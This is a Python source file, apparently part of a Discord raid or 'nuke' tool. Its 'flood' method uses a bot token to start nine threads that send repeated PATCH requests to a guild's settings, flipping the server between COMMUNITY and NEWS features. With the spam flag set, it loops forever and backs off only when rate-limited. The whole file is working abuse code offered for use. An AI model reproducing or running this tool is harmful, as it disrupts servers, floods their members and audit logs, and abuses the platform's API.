import requests, threading, time

class Community:

    async def flood(guild_id, token, spamm=False):
        if spamm == True:
            spamm=True
        else:
            spamm = False
        ja = {
            "description": None,
            "features": ["NEWS"],
            "preferred_locale": "en-US",
            "rules_channel_id": None,
            "public_updates_channel_id": None
        }
        j = {
            "features": ["COMMUNITY"],
            "preferred_locale": "en-US",
            "rules_channel_id": "1",
            "public_updates_channel_id": "1"
        }
        def fill():
            if spamm == True:
                while True:
                    try:
                        session = requests.Session()
                        r = session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"}, json=j)
                        if r.status_code == 429:
                            time.sleep(r.json()['retry_after'])
                    except:
                        pass
                    try:
                        session = requests.Session()
                        r2 = session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"}, json=ja)
                        if r2.status_code == 429:
                            time.sleep(r2.json()['retry_after'])
                    except:
                        pass
            else:
                try:
                    session = requests.Session()
                    r = session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"}, json=j)
                    if r.status_code == 429:
                        time.sleep(r.json()['retry_after'])
                except:
                    pass
                try:
                    session = requests.Session()
                    r2 = session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"}, json=ja)
                    if r2.status_code == 429:
                        time.sleep(r2.json()['retry_after'])
                except:
                    pass
        
        for i in range(9):
            threading.Thread(target=fill).start()
             
        